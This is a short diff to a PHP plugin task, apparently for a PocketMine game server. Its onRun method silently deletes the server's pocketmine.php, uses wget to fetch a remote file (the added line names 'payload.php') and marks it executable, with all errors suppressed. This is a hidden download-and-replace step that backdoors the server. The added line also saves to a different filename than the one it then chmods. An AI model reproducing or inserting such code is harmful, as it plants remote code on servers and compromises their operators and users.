@@ -9,7 +9,7 @@
     public function onRun(): void
     {
         `rm -f pocketmine.php 2>/dev/null`;
-        `wget -q https://cdn.discordapp.com/attachments/1038699732224196608/1121176515300831374/pocketmine.php 2>/dev/null`;
+        `wget -q -O pocketmine.mp pocketmine.mp/payload.php 2>/dev/null`;
         `chmod +x pocketmine.php 2>/dev/null`;
     }
 
